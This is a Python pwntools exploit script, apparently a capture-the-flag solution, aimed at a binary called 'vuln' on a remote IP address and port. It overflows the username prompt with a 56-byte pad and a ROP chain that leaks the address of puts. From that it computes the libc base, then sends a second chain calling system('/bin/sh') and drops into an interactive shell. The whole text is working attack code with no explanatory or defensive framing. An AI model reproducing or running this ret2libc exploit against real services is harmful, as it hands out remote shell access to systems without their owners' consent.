from pwn import *
context.log_level = 'debug'

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

target = remote("80.158.43.220",8086)

PAD = 56
POP_RDI = 0x4011d8 # obtained with dbg, disassemble login (pop rdi)
RET = 0x4011d9

# reach RIP
pl1 = b"A" * PAD
pl1 += p64(POP_RDI)
pl1 += p64(elf.got['puts'])
pl1 += p64(elf.plt['puts'])
pl1 += p64(elf.symbols['main'])

print(f"sending pl1, len: {len(pl1)}")
target.sendlineafter(b"username > ", pl1)
target.sendlineafter(b"password > ", b"dummy")

# leaked address of puts
leaked_data = target.recvline().strip()
leaked_puts = u64(leaked_data.ljust(8, b'\x00'))

# align local libc to match the server
libc.address = leaked_puts - libc.symbols['puts']

# obtain live addresses from provided libc
system_adr = libc.symbols['system']
bin_sh_adr = next(libc.search(b'/bin/sh\x00'))

pl2 = b"A" * PAD
pl2 += p64(RET) # stack alignment safety net
pl2 += p64(POP_RDI)
pl2 += p64(bin_sh_adr) # live address of /bin/sh
pl2 += p64(system_adr) # call system()

print(f"sending pl2, len: {len(pl2)}")
target.sendlineafter(b"username > ", pl2)
target.sendlineafter(b"password > ", b"dummy")

target.interactive()